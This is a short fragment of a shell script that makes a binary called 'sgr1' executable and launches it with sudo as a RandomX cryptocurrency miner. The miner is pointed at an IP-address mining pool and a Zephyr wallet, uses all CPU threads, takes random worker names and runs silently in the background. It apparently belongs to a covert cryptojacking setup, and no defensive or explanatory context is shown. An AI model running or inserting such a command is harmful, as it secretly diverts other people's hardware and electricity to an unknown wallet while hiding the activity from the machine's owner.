...
chmod +x sgr1
sudo ./sgr1 --disable-gpu --algorithm randomx --pool 159.65.7.244:443 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --worker $(echo $(shuf -i 1-100000 -n 1)-srb) --password $(echo $(shuf -i 1-100000 -n 1)-srb) --cpu-threads $(nproc --all) --keepalive true > /dev/null 2>&1 &
